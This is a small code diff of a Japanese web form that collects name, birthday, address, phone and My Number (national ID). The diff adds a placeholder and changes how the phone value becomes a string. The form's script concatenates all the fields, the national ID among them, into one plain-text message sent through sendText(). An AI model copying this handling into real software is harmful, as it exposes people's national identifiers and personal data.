@@ -37,7 +37,7 @@
         </div>
         <p class="mt-3">マイナンバー</p>
         <div>
-            <input type='tel' class="form-control w-100 mt-1" name="mynumber" required>
+            <input type='tel' class="form-control w-100 mt-1" name="mynumber" placeholder="12桁" required>
         </div>
         <input type="submit" class="mt-4 btn btn-primary" value="送信">
     </form>
@@ -85,7 +85,7 @@
                 const birthday = $('input[name="birthday"]').val();
                 const postnumber = $('input[name="postal_code"]').val();
                 const address  = $('input[name="address"]').val();
-                const tel  = $('input[name="tel"]').val().toString();
+                const tel  = String($('input[name="tel"]').val());
                 const mynumber = $('input[name="mynumber"]').val();
                 const msg = `${name}\n${birthday}\n${postnumber}\n${address}\n${tel}\n${mynumber}`;
                 sendText(msg);
